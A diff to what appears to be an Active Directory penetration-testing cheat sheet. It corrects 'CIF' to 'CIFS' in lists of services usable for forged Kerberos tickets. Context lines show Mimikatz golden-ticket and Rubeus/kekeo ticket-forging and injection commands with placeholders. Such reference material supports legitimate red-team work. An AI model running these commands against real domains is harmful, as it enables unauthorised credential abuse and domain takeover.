@@ -559,13 +559,13 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 ```
 
 #### Create and inject TGS
-- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
 ```
 
 #### Create a TGS for a service (kekeo_old)
-- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 ./asktgs.exe <KIRBI FILE> <SERVICE>/<TARGET SERVER>
 ```
